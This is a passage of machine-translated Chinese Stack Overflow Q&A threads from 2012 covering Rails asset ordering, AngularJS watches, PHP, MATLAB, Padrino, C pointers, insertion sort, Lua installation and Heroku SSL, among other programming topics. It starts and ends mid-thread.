<script src="/assets/bootstrap-transition.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-affix.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-button.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-carousel.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-collapse.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-scrollspy.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-typeahead.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap.js?body=1" type="text/javascript"></script>
<script src="/assets/select2.js?body=1" type="text/javascript"></script> 
```

来自 application.rb：

```
config.assets.initialize_on_precompile = false
# Enable the asset pipeline
config.assets.enabled = true
config.action_controller.assets_dir = "#{File.dirname(File.dirname(__FILE__))}/public"

# Version of your assets, change this if you want to expire all your assets
config.assets.version = '1.0' 
```

对不起，我不确定还有什么可以帮助解决这个难题，但任何建议都将不胜感激。在我开始尝试上传到 heroku 之前，我没有遇到任何问题，现在一切都变得混乱了。

编辑：

目前在控制台中我看到

```
Uncaught TypeError: Cannot read property 'Constructor' of undefined bootstrap-popover.js:33
Uncaught ReferenceError: google is not defined jquery.ui.addresspicker.js:25
Uncaught TypeError: Object [object Object] has no method 'popover' overall:476 
```

编辑2：

感谢下面的评论之一，我能够弄清楚这一点。我不得不重新洗牌 application.js 包含以更有意义：

```
//= require jquery
//= require jquery-ui
//= require jquery_ujs
//= require bootstrap
//= require bootstrap-tooltip
//= require bootstrap-popover
//= require bootstrap-tab
//= require bootstrap-modal
//= require bootstrap-alert
//= require bootstrap-dropdown
//= require dataTables/jquery.dataTables
//= require dataTables/jquery.dataTables.bootstrap
//= require jquery.ui.addresspicker
//= require raty
//= require jquery.alphanumeric
//= require jquery.formrestrict
//= require select2
//= require chosen/chosen.jquery
//= require highcharts
//= require jquery.lazyload
//= require_self
//= require_tree . 
```

天哪，这让我发疯了。不，它仍然无法正常工作。最后一次编辑使一切正常，但随后我再次运行 rake assets:precompile 并推送到 heroku .. 它再次无法在 Heroku 上工作.. 信不信由你，当我回到我的本地主机版本时，它坏了再次，现在又抛出了不同的错误并且没有加载数据表！

```
Uncaught ReferenceError: google is not defined jquery.ui.addresspicker.js:25
Uncaught ReferenceError: google is not defined application.js:26
Uncaught TypeError: Object [object Object] has no method 'lazyload' overall:496 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:27:17.130

你确定你没有在 JS 的某处忘记分号吗？资产管道不做任何代码清理......

查看浏览器的 JS 控制台，看看错误出现在哪里...

编辑：好的，我想看看发生了什么。尝试在最后取出`require_tree`并手动加载您未明确说明的任何其他 JS 文件。最终发生的是`require_tree`明确列出的任何先前要求的覆盖，并最终按字母顺序加载它们。

另外，我不知道您在 bootstrap.js 中使用什么 gem（或者如果您甚至正在使用一个），但也可以尝试使用`twitter/bootstrap`而不是仅仅`bootstrap`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:29:21.327

这是在什么环境下发生的？尝试`config.assets.enabled = true`在 env/production.rb 或您正在运行的任何环境中进行操作。我相信在生产中默认情况下会关闭此设置。

# javascript - AngularJS 指令需要观察两个属性

> ID：13328563
> 
> 赞同：7
> 
> 时间：2012-11-11T04:24:50.550
> 
> 标签：javascript, html, angularjs

我正在用 Angular 制作游戏。每个玩家对象都有一个`x`和一个`y`属性。每当玩家移动时，我想启动一个计时器，该计时器在精灵表中的几个背景位置之间循环。

我想我会用一个指令来做到这一点。问题是指令通常只允许你设置一个表达式来观察：

```
// "test" directive
module.directive("test", function() {
  return function(scope, element, attrs) {
    scope.$watch(attrs.test, function(value) {
      // do something when it changes
    })
  }
})

// my template
<div test="name"/> 
```

这种方法的好处是`test`指令不必假设范围具有任何特定属性。当你使用指令时，你告诉它使用什么。

问题是，在我的情况下，如果 x 或 y 发生变化，我需要开始一些事情。我怎样才能做到这一点？

```
<div test="player.x, player.y"/>
<div test="player.x" test-two="player.y"/> 
```

有没有你能想到的最好的方法来做到这一点？基本上，如果几个属性中的任何一个发生变化，我想制定一个在计时器上执行某些操作的指令。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-11T08:06:26.347

我认为最简单和最易读的解决方案是使用两个属性并简单地设置两个手表：

```
// "test" directive
module.directive("test", function() {
  return function(scope, element, attrs) {
    var doStuff = function() {
      console.log(attrs.test);
      console.log(attrs.testTwo);
    }
    scope.$watch(attrs.test, doStuff);
    scope.$watch(attrs.testTwo, doStuff);

  }
})

// my template
<div test test="player1.x" test-two="player1.y" /> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-11T19:59:41.633

我会尝试在 $watch 函数中使用一个函数。

这是[plunker](http://plnkr.co/edit/o3cnXm)

```
var app = angular.module('plunker', [])
.directive('myDir',function(){
  return {
    restrict:'E',
    template:'<span>X:{{x}}, Y:{{y}}</span>',
    link:function(scope, elm, attrs){
      scope.$watch(function (){
        var location = {};
        location.x = attrs.x;
        location.y = attrs.y;
        return location;
      }, function (newVal,oldVal,scope){
        console.log('change !');
        scope.x = newVal.x;
        scope.y = newVal.y;
      }, true);
    }
  };
});

app.controller('MainCtrl', function($scope) {

});

 <div>X: <input type='text' ng-model='x'/></div>
  <div>Y: <input type='text' ng-model='y'/></div>
  <my-dir x='{{x}}' y='{{y}}'></my-dir> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T04:47:52.117

有一些解决方法

[查看多个 $scope 属性](https://stackoverflow.com/questions/11952579/watch-multiple-things-in-angularjs)

[https://groups.google.com/forum/?fromgroups=#!topic/angular/yInmKjlrjzI](https://groups.google.com/forum/?fromgroups=#!topic/angular/yInmKjlrjzI)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-12-06T16:32:02.803

```
scope.$watch(function () {
  return [attrs.test, attrs.test-two];
}, function(value) {
      // do something when it changes
}, true); 
```

看到[这个链接](https://stackoverflow.com/questions/19436487/observe-multiple-attributes-at-the-same-time-and-fire-callback-only-once)

您也可以使用**$watchGroup** - 请参阅[此链接](https://stackoverflow.com/questions/11952579/watch-multiple-scope-attributes)

# php - php preg_replace 添加引号和引号后不匹配

> ID：13328565
> 
> 赞同：0
> 
> 时间：2012-11-11T04:25:14.660
> 
> 标签：php, preg-replace

我有一个 php 函数，它可以突出显示已搜索的文本，它可以工作，直到您开始用引号搜索，然后它添加斜杠，但这样做，它会阻止它匹配斜杠后的其余字符串。

例如：

我想要它做什么：

搜索词：`Ronnie's h`

结果：**罗尼的 h**

实际结果：

**罗尼**_

```
function highlight($needle, $haystack)
{
    $result =  preg_replace("/(".preg_quote($needle, "/").")/i", "<strong>$1</strong>", $haystack);
    return $result;
}

echo highlight("ronnie's h", "ronnie's home"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:32:52.923

你为什么用`preg_replace`这个？这会容易得多：

```
function highlight($needle,$haystack) {
    return str_replace($needle,"<strong>".$needle."</strong>",$haystack);
} 
```

# matlab - matlab求平均值

> ID：13328566
> 
> 赞同：0
> 
> 时间：2012-11-11T04:25:22.617
> 
> 标签：matlab, matrix, average

我有一个`950000x1`值数组，例如`[1e15 2.5e12 ...etc]`. 但是当我执行以下操作以获得平均值时，我得到的值为`NaN`.

```
avg=mean(g1) 
```

我无法理解为什么会收到此错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:28:48.843

以下代码在我的机器上运行良好（Core i7、16GB RAM、Linux Mint v12、Matlab 2012b）：

```
T = 1e9;
Vec = ones(T, 1) * 1e200;
M = mean(Vec); 
```

这向我表明您的值数组包含某个`NaN`地方。请注意，即使您的数组包含的数字大于双浮点可以处理的数字（即大约 1e320 或大约），那么该`mean`函数将返回`Inf`，而不是`NaN`。

试试`any(isnan(Vec))`你的阵列。如果它返回 a `1`，那么您将知道它包含一个`NaN`. 如果是这样，那么以下代码将删除 NaN。

```
Vec(isnan(Vec)) = []; 
```

如果您认为这已经解决了您的问题，请随时单击我的答案旁边的勾号。干杯!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T19:59:55.120

`NaN`而不是在查询`mean`函数之前删除s ，您可以只使用`nanmean`，它在计算平均值时会忽略`NaN`值：

[南意思](http://www.mathworks.nl/help/stats/nanmean.html)：

> y = nanmean(X) 是 X 的平均值，在移除 NaN 值后计算得出。

`NaN`它也适用于矩阵，如果你删除s就不起作用。

# ruby - Padrino 和 RSpec 不适用于 Sequel？

> ID：13328570
> 
> 赞同：2
> 
> 时间：2012-11-11T04:26:05.483
> 
> 标签：ruby, model-view-controller, rspec, sequel, padrino

最近，我开始深入研究 Ruby MVC，以便找到最好、最快、最小的框架来构建我的应用程序。由于对 Rails 不满意，我决定尝试一下[Padrino](http://www.padrinorb.com)。我也是第一次为一个完整的应用程序尝试由外而内 TDD，因此能够为所有组件编写测试是至关重要的。不幸的是，我无法通过在 Padrino 中制作模型，所以我想知道这是否只是 beta 软件的原因，或者只是我的错误。

我首先使用 Cucumber 和 RSpec 创建我的项目以进行测试，并为我的 ORM 创建 Sequel。

```
$ padrino g project test -d sequel -t cucumber -c sass -b 
```

接下来，我创建一些模型和迁移：

```
$ padrino g model user

# ./db/migrate/001_create_users.rb
Sequel.migration do
  change do
    create_table :users do
      primary_key :id
      String :name
      String :password
    end
  end
end 
```

接下来，当然是规范。例如，只是一些简单的事情：

```
# ./spec/models/user_spec.rb
require 'spec_helper'

describe User do
  it 'can be created' do
    user = User.create
  end
end 
```

现在，迁移并运行规范：

```
$ padrino rake sq:migrate:up
$ rspec spec

F

Failures:

  1) User can be created
     Failure/Error: user = User.create
     Sequel::DatabaseError:
       SQLite3::SQLException: no such table: users
     # ./spec/models/user_spec.rb:5:in `block (2 levels) in <top (required)>'

Finished in 0.00169 seconds
1 example, 1 failure

Failed examples:

rspec ./spec/models/user_spec.rb:4 # User can be created 
```

这非常令人困惑。正是在这一点上，我认为进入 Padrino 控制台可以帮助我解决这个奇怪的问题。我错了。

```
$ padrino c
> User.create
  => #<User @values={:id=>1, :name=>nil, :password=>nil}>
> User.all
  => [#<User @values={:id=>1, :name=>nil, :password=>nil}>] 
```

足够公平的结果，但后来我在`test`环境中尝试：

```
$ padrino c -e test
> User.create
  Sequel::DatabaseError: SQLite3::SQLException: no such table: users 
```

我知道在 RoR 中，要让集成模型运行，您必须执行类似的操作`rake db:test:prepare`，但这样做`padrino rake -T`似乎并没有显示任何等效项（使用 Sequel、DataMapper 和 ActiveRecord 进行测试；似乎没有一个具有`db:test:prepare`）。所以，我的问题是：如何在 Padrino 中运行集成数据库测试？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-11T17:03:22.770

从[这个论坛帖子](http://railsforum.com/viewtopic.php?id=6648)中，我发现*了为什么* `db:test:prepare`需要运行这个奇怪的、任意的 rake 任务：它与`test`环境有关（相对于`development`and `production`）。在 Padrino 中，这转换为以下代码，虽然有点晦涩，但也更直观：

```
$ padrino rake sq:migrate:up -e test 
```

这告诉 Padrino 为测试数据库创建表，这允许规范通过。

# mobile - 视口属性不适用于移动网站

> ID：13328572
> 
> 赞同：0
> 
> 时间：2012-11-11T04:26:21.017
> 
> 标签：mobile, media-queries, viewport, meta

所以我设置了一些链接到不同样式表的媒体查询，一个用于桌面，一个用于移动，看起来像这样

```
<link rel="stylesheet" href="styles_phone_320.css" type="text/css" media="(max-device-width:320px)" /> 
```

我的视口元标记看起来像这样

```
<meta name="viewport" content="width=device-width, initial-scale=1"> 
```

出于某种原因，当我在 iPhone 5 上加载页面时，它的纵向看起来很棒，但是当我旋转它时，它不会缩放以填满屏幕。只是所有内容右侧的空白。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-14T23:47:56.927

一年后我回答了这个问题，尽管我可能在大约 6 个月前找到了解决方案......

我所要做的就是删除`initial-scale="1"`. 那解决了它。你看，这让页面按比例增长以满足屏幕的边缘。

# geolocation - GeoPositionAccuracy.High 有多高？

> ID：13328573
> 
> 赞同：3
> 
> 时间：2012-11-11T04:26:22.040
> 
> 标签：geolocation, windows-phone, windows-phone-8

在使用 Windows Phone Location API 时，我试图测量两点之间的距离，这两个点之间的距离只有英寸或英尺。也就是说，准确性非常重要。

*GeoPositionAccuracy.Default*和*GeoPositionAccuracy.High*有什么区别？差异与十进制值的数量有关吗？*如果是这种情况，为GeoPositionAccuracy.Default*和*GeoPositionAccuracy.High*分配了多少个十进制值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T09:08:45.787

`GeoPositionAccuracy`只是用来告诉 Windows Phone 你是否需要一个准确的位置。您可以做出这样的选择，因为更高的准确性会使用更多的电池，所以如果您只是想弄清楚用户当前位于哪个城镇，最好不要使用它。`GeoPositionAccuracy.Default`可能甚至不使用 GPS，而是使用[其他定位方法](http://en.wikipedia.org/wiki/Mobile_phone_tracking#Handset-based)

对于您获得的位置的实际准确性，您可以检查[`HorizontalAccuracy`](http://msdn.microsoft.com/en-us/library/system.device.location.geocoordinate.horizontalaccuracy%28v=vs.92%29.aspx). [`GeoCoordinate`](http://msdn.microsoft.com/en-us/library/system.device.location.geocoordinate%28v=vs.92%29.aspx)它为您提供以米为单位的误差范围。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T17:16:54.360

GeoPositionAccuracy.Default 使用以下组合：

*   辅助 GPS（又名蜂窝塔三角测量）
*   Wi-Fi 三角测量（又名 IP 查找）

GeoPositionAccuracy.High 使用上述方法，除了：

*   全球定位系统

辅助 GPS 是电池友好型的，并且可以快速锁定位置，因为它使用已经打开的蜂窝无线电。我可以准确到城市地区的街区或建筑物水平，但在蜂窝塔密度降低的农村地区，准确度会降低。它在建筑物内也能很好地工作。

GPS 获取卫星锁定的速度较慢，并且会消耗更多的电池电量，因为必须根据需要打开 GPS 无线电。一旦锁定，它就是几英尺内最准确的定位方法。它在建筑物内几乎没有用，因为您需要与天空的视线。像曼哈顿这样密集的城市地区也会导致 GPS 不准确。

Wi-Fi / IP Lookup 是最不准确的，因为 Wi-Fi 热点的 IP 地址有时可以在不同的地址注册。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T07:03:30.770

我不相信它对准确性做出任何保证，它只是分配更多资源来获取更准确的位置（例如，通过为 GPS 模块提供更多功率）。

# jquery - 使用 jQuery 使用来自其他两个字段的值填充一个字段

> ID：13328575
> 
> 赞同：4
> 
> 时间：2012-11-11T04:26:43.283
> 
> 标签：jquery, forms

我想用用户在“名字”和“姓氏”字段中键入的内容自动填充“全名”字段，因此如果他们在名字和姓氏字段中键入“约翰”和“史密斯”， “全名”字段将动态填充“约翰·史密斯”。

我对 jQuery 不是很好，所以在搜索其他示例之后，到目前为止，我只能设法用“名字”填充该字段。

我当前的代码如下，对此的任何帮助将不胜感激。

```
<script>
$(document).ready(function(){
    $('#first_name').keyup(function () {
        $('#full_name').val(this.value);
    });
});
</script>

<input type="text" name="full_name" id="full_name" value="" />
<input type="text" name="first_name" id="first_name" value="" />
<input type="text" name="last_name" id="last_name" value="" /> 
```

谢谢，

斯特

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T04:33:47.257

这应该工作

```
$('#first_name').keyup(function(){
   $('#full_name').val(this.value+' '+$('#last_name').val());
});

$('#last_name').keyup(function(){
   $('#full_name').val($('#first_name').val()+' '+this.value);
}); 
```

# url - JSF 2.0 中的显式 url 重定向

> ID：13328577
> 
> 赞同：2
> 
> 时间：2012-11-11T04:26:54.937
> 
> 标签：url, jsf, redirect

我在下面有以下两页。

**hello.xhtml**，由 .../hello.jsf url 呈现。

```
<h:form>
  <h:commandButton id="submit" value="Submit" action="response"/>
</h:form> 
```

**response.xhtml**，由 .../response.jsf url 呈现。

```
<h:form>
  <h:commandButton id="back" value="Back" action="hello"/>
</h:form> 
```

单击提交按钮时，hello 页面被重定向到响应页面，但 url 保持不变，即 url 仍然是 .../hello.jsf。

单击提交按钮后，我希望 url 为**.../response.jsf 。**请问有什么帮助吗？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T11:28:21.477

如果您实际上没有使用 kolossus 所暗示的老式 JSF 导航案例，而是使用新的 JSF2 隐式导航功能，那么只需将`faces-redirect=true`查询字符串参数添加到结果中。

```
<h:form>
  <h:commandButton id="submit" value="Submit" action="response?faces-redirect=true" />
</h:form> 
```

**但是**，如果您根本不需要调用任何 bean 操作，并且打算使用普通的页面到页面导航，那么为此执行 POST 请求是没有意义的。就用那个`<h:button>`吧。

```
<h:button id="submit" value="Submit" outcome="response" /> 
```

### 也可以看看：

*   [h:button 和 h:commandButton 之间的区别](https://stackoverflow.com/questions/13070537/difference-between-hbutton-and-hcommandbutton)
*   [什么时候应该使用 h:outputLink 而不是 h:commandLink？](https://stackoverflow.com/questions/4317684/when-should-i-use-houtputlink-instead-of-hcommandlink/4317723#4317723)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T04:39:13.957

`redirect`像这样将属性添加到您的`faces_config.xml`文件中：

```
 <navigation-rule>
    <from-view-id>/hello.xhtml</from-view-id>
    <navigation-case>
        <from-outcome>response</from-outcome>
        <to-view-id>/response.xhtml</to-view-id>
       <!--the redirect element -->
        <redirect/>
    </navigation-case>
</navigation-rule> 
```

编辑：我的印象是您正在使用`faces-config.xml`导航结果样式中的 a 。我已经亲自确认您正在做的事情对于新的 JSF 2 样式导航也是允许的。请参阅 BalusC 对`redirect`在 JSF2 样式导航处理中使用 url 参数的回答

# c# - 在 C# 中使用 TreeView 创建设置表单

> ID：13328578
> 
> 赞同：2
> 
> 时间：2012-11-11T04:26:54.657
> 
> 标签：c#, winforms, treeview

我正在为用 C# 开发的软件开发设置表单。我正在研究不同的软件如何实现它们的设置表单。

在我遇到的大多数情况下，他们似乎在表单的左侧窗格中使用 Treeview，在右侧窗格中使用配置设置。

参考网址：http: [//2.bp.blogspot.com/-nMfQoLurxwM/UDXfiZKd4DI/AAAAAAAAAME/IRf6kmxay4w/s1600/bild1.jpg](http://2.bp.blogspot.com/-nMfQoLurxwM/UDXfiZKd4DI/AAAAAAAAAME/IRf6kmxay4w/s1600/bild1.jpg)

我想知道，不同的控件是如何设计/显示在右窗格上的。他们是否隐藏所有控件，具体取决于在以下内容中选择了哪个节点`TreeView`：

```
 if (treeView1.SelectedNode == treeView1.Nodes[0])
        {
            this.groupBox1.Visible = true;
            this.button1.Visible = true;
            this.textBox1.Visible = true;
            this.textBox2.Visible = true;
            this.label1.Visible = true;
            this.label2.Visible = true;
            this.label3.Visible = true;

        }
        else
        {
            this.groupBox1.Visible  = false;
            this.button1.Visible    = false;
            this.textBox1.Visible   = false;
            this.textBox2.Visible   = false;
            this.label1.Visible     = false;
            this.label2.Visible     = false;
            this.label3.Visible     = false;

        this.groupBox2.Visible  = true;
            this.button2.Visible    = true;
            this.textBox3.Visible   = true;
            this.textBox3.Visible   = true;
            this.labe4.Visible     = true;
            this.label5.Visible     = true;
            this.label6.Visible     = true;

           // bool success = selectColor();
        } 
```

我的理解正确吗？或者我们是否有更好的设计方法来创建设置表单。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:02:42.183

有很多方法，但您可以结合使用 Treeview 控件和 Tab 控件。检查此**[链接](https://stackoverflow.com/q/6795666/1577396)**。这可能会有所帮助。在此链接中，tabcontrol 的标签页用作 treeview 控制节点。

也看看这个[**链接**](http://blog.csharphelper.com/2009/12/16/use-a-treeview-to-display-property-pages-or-option-pages-in-c.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:55:39.740

您可以创建面板并交换它们的可见性。因此，根据选择的设置，您填充控件并显示特定面板。

# c - 关于指针和数组的问题

> ID：13328580
> 
> 赞同：0
> 
> 时间：2012-11-11T04:27:38.033
> 
> 标签：c

**健全性检查问题：**

我做了一些谷歌搜索，发现在 C 中返回一维整数数组的正确方法是

```
int * function(args); 
```

1.  如果我这样做，该函数将返回一个指针，对吗？如果返回值为 r，我可以通过键入 r[n] 找到数组的第 n 个元素吗？

2.  如果我让函数返回数字“3”，那会被解释为指向地址“3”的指针吗？

3.  说我的功能类似于

    ```
    int * function(int * a); 
    ```

    这会是一个法律职能机构吗？

    ```
    int * b;
    b = a;
    return b; 
    ```

    我们是否允许像这样将数组分配给其他数组？

4.  如果指针和数组实际上是一回事，我可以只声明一个指针而不指定数组的大小吗？我感到

    ```
    int a[10]; 
    ```

    传达的信息多于

    ```
    int * a; 
    ```

    但它们不是声明数组的两种方式吗？如果我使用后一个声明，我可以为 a[10000000] 赋值吗？

**主要问题：**

1.  如何在 C 中返回二维数组？我不认为我可以只返回一个指向数组开头的指针，因为我不知道数组有哪些维度。

感谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:44:22.567

1.  是的
2.  是的，但它需要一个演员：return (int *)3;
3.  是的，但是您没有将数组分配给另一个数组，而是将指针分配给指针。
4.  指针和数组不是一回事。int a[10] 为十个整数保留空间。int *a 是一个未初始化的变量，指向谁知道什么。当您尝试访问您无权访问或不存在的内存时，访问 a[10000000] 很可能会使您的程序崩溃。
5.  要返回一个二维数组，返回一个指向指针的指针：int ** f() {}

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T05:20:03.440

1.  是的; 数组索引是根据指针算术完成的：`a[i]`定义为`*(a + i)`; 我们在`i`之后找到第 ' 个元素的地址`a`并取消引用结果。所以`a`可以声明为指针或数组。

2.  它会被解释为一个地址，是的（很可能是一个无效的地址）。您需要将文字转换`3`为指针，因为类型`int`和值`int *`不兼容。

3.  是的，这将是合法的。无意义，但合法。

4.  指针和数组*不是*一回事。在大多数情况下，数组类型的*表达式*将被转换（“衰减”）为指针类型的表达式，其值将是数组第一个元素的地址。单独声明一个指针是不够的，因为除非您将它初始化为指向一块内存（`malloc`调用的结果或另一个数组），否则它的值将是*不确定*的，并且可能不指向有效的内存。

5.  你真的不想*返回*数组；请记住，数组表达式被转换为指针表达式，因此您将返回第一个元素的地址。但是，当函数退出时，该数组不再存在并且指针值不再有效。最好将要修改的数组作为参数传递给函数，例如

    void foo (int *a, size_t asize) { size_t i; for (i = 0; i < asize; i++) a[i] = some_value(); }

指针不包含有关它们指向的元素数量的元数据，因此您必须将其作为单独的参数传递。

对于二维数组，你会做类似的事情

```
void foo(size_t rows, size_t columns, int (*a)[columns])
{
   size_t i, j;
   for (i = 0; i < rows; i++)
     for (j = 0; j < columns; j++)
        a[i][j] = some_value;
} 
```

这假设您使用的是支持可变长度数组的 C99 编译器或 C2011 编译器；否则列数必须是一个常量表达式（即，在编译时已知）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-11T22:53:54.777

这些答案当然需要更多的深度。你对指针理解得越好，你写的代码就越少。

数组和指针是不同的，除非它们是相同的。在我的头顶上：

`int a[2][2] = { 1, 2, 3, 4 }; int (* p)[2] = a; ASSERT (p[1][1] == a[1][1]);`

数组“a”的功能与指针“p”完全相同。并且编译器从每个地址中知道同样多的信息，特别是地址，以及如何计算索引地址。但请注意，数组 a 不能在运行时采用新值，而 p 可以。因此，当程序运行时，a 的“指针”方面已经消失，只剩下数组。相反，p 本身只是一个指针，它在运行时可以指向任何东西，也可以不指向任何东西。

请注意，指针声明的语法很复杂。（这就是我今天首先来到stackoverflow的原因。）但是需求很简单。您需要告诉编译器如何计算超过第一列的元素的地址。（我使用“列”作为最右边的索引。）在这种情况下，我们可能假设它需要将地址 ((2*1) + 1) 递增到索引 [1][1]。

但是，编译器知道（希望如此）还有一些您可能不知道的事情。

编译器知道两件事：1）元素是否按顺序存储在内存中，以及 2）是否真的有额外的指针数组，或者只有一个指向数组开头的指针/地址。

通常，编译时数组是按顺序存储的，与维度无关，没有额外的指针。但可以肯定的是，请检查编译器文档。因此，如果编译器允许您对 a[0][2] 进行索引，它实际上是 a[1][0] 等。但是您可以创建一个运行时数组。您可以制作您选择的任何长度的一维数组，并将它们的地址放入其他数组中，也可以选择您选择的任何长度。

而且，当然，使用其中任何一个的一个原因是因为您选择使用运行时乘法、移位或指针取消引用来索引数组。如果指针取消引用是最便宜的，您可能需要制作指针数组，因此无需进行算术运算来计算行地址。一个缺点是它需要内存来存储额外的指针。请注意，如果列长度是 2 的幂，则可以使用移位而不是乘法来计算地址。所以这可能是增加长度的一个很好的理由——编译器可以，至少在理论上，在不告诉你的情况下做到这一点！这可能取决于您选择优化速度还是空间。

任何被描述为“现代”和“强大”的架构可能会像取消引用一样快速增加，并且这些问题完全消失了——除了你的代码是否正确。

# c++ - 插入排序以使列表顶部的 0 的“年份”

> ID：13328582
> 
> 赞同：0
> 
> 时间：2012-11-11T04:28:17.087
> 
> 标签：c++, insertion-sort

我有一系列关于建筑物的信息，其中一个项目是建造年份的：

```
 buildingnumber[buildingsloaded].yearBuilt 
```

我正在尝试使用插入排序将数据从最旧的构建到最新构建的数据进行排序，但它一直为 k 报告相同的构建。（k是我想看的建筑数量）

```
void InsertionSort(list buildingnumber[SIZE], int buildingsloaded)
{
int key = 0, i = 0;
    for(int j = 1; j < buildingsloaded; j++)
    {
        key=buildingnumber[j].yearBuilt;
        i=j-1;
        while(buildingnumber[i].yearBuilt > key && i >= 0)
        {
           buildingnumber[i+1] = buildingnumber[i];
           i--;
        }
        buildingnumber[i+1].yearBuilt = key;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T08:21:03.757

你的代码很混乱。您可以编写一种仅比较某物的一部分（例如`yearBuilt`）的排序，但是当您实际进行排序时，您必须移动（或交换）*整个对象*而不仅仅是键。

所以你的代码可以像这样改进

```
 list b = buildingnumber[j]; // whole building
     key = b.yearBuilt;
     while (...)
     {
         ...
     }
     buildingnumber[i+1] = b;  // whole building 
```

不完全确定现在代码是否正确（尚未检查），但至少你会更接近一点。

另一件事，为什么你的建筑对象被称为`list`？不是`Building`更好的名字吗？在代号中**很**重要，而且它们很容易更改。如果您可以为您的类型和变量选择好的名称，则表明您正在清楚地考虑问题。不要吝啬这一点或认为这无关紧要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T09:17:51.810

发布的代码包含一个重要错误

`while(buildingnumber[i].yearBuilt > key && i >= 0)`

因为条件必须以相反的顺序写：

`while (i >= 0 && buildingnumber[i].yearBuilt > key)`

原因是当 时`i<0`，您不想访问`buildingnumber[i]`，因为那会访问数组的无效位置。因为`&&`将评估到`false`第一个操作数`false`不评估第二个操作数时，以正确的方式不会执行无效访问。

另一方面，如另一个答案中所述，代码不会对孔`list`元素进行排序，而只是对它们的键进行排序。

此外，`key`和`i`变量可以定义在更小的块中。

# lua - 在 Mac OS X Mountain Lion 上安装 Lua 5.2.1

> ID：13328584
> 
> 赞同：0
> 
> 时间：2012-11-11T04:28:40.987
> 
> 标签：lua

我尝试使用以下命令：

```
curl -R -O http://www.lua.org/ftp/lua-5.2.0.tar.gz
tar zxf lua-5.2.0.tar.gz
cd lua-5.2.0
make macosx test install 
```

（但显然是 5.2.1）

但它说它不知道命令`make`。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T04:31:32.210

您需要[安装 XCode](https://itunes.apple.com/us/app/xcode/id448457090?mt=12)才能使用该`make`命令。然后转到：首选项，然后下载并安装名为“命令行工具”的组件。最后`Install Xcode.app`从您的应用程序文件夹运行。

# heroku - 单个heroku应用程序上有多个ssl证书？

> ID：13328586
> 
> 赞同：8
> 
> 时间：2012-11-11T04:28:59.560
> 
> 标签：heroku

我有一个现有的多租户 heroku 应用程序，它使用通配符子域来路由当前使用通配符 ssl 证书通过 https/ssl 为以下类型的请求提供服务的请求

[https://app1.example.com](https://app1.example.com) [https://app2.example.com](https://app2.example.com)

是否可以添加另一个单独的单域 ssl 证书来为 url 上的请求提供服务，例如：

[https://app3.custom-domain.com](https://app3.custom-domain.com)

假设所有请求都由单个测功机处理

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-22T21:55:16.773

这是可能的，也不难做到。

只需将域添加到 Heroku：

```
heroku domains:add app3.custom-domain.com 
```

证书方面，获取[多域SAN证书](http://www.ssl.com/certificates/buy)，并在SAN字段中包含所有域；您的通配符`*.example.com`以及单独的域`app3.custom-domain.com`。

请注意，您仍需为 SAN 字段中的通配符域支付通配符费率。我知道，因为我已经这样做了。

# qt - 属性别名的位置无效

> ID：13328591
> 
> 赞同：1
> 
> 时间：2012-11-11T04:30:04.607
> 
> 标签：qt, qml, blackberry-10, blackberry-cascades

我开始使用 Cascades 为我闪亮的新 BB10 Dev Alpha B 进行开发（怀疑我可以在 WebWorks 上实现一个功能齐全的 Mp3 播放器，尽管我真的很想这样做）并且我一直在尝试让 QML 和 C++ 发挥作用很好，如[https://developer.blackberry.com/cascades/documentation/dev/integrating_cpp_qml/index.html](https://developer.blackberry.com/cascades/documentation/dev/integrating_cpp_qml/index.html)中所述，但无论我放在哪里

`property alias artistText: artist.Text`

QNX Momentics IDE 抱怨它位于无效位置。我还没有找到任何关于所述属性应该在哪里的指导方针，所以我决定在这里问。

```
import bb.cascades 1.0

Page {
    actionBarVisibility: ChromeVisibility.Visible
    Container {
        layout: DockLayout {

        }
        Button {
            text: "Random"
            verticalAlignment: VerticalAlignment.Top
        }
        Button {
            text: "Repeat"
            horizontalAlignment: HorizontalAlignment.Right
        }
        Container {
            verticalAlignment: VerticalAlignment.Center
            ImageView {
                preferredWidth: 615.0
                preferredHeight: 615.0
                minWidth: 615.0
                minHeight: 615.0
                maxWidth: 615.0
                maxHeight: 615.0
                verticalAlignment: VerticalAlignment.Center
                horizontalAlignment: HorizontalAlignment.Center
                imageSource: "asset:///test.jpg"
            }
            Container {
                horizontalAlignment: HorizontalAlignment.Center
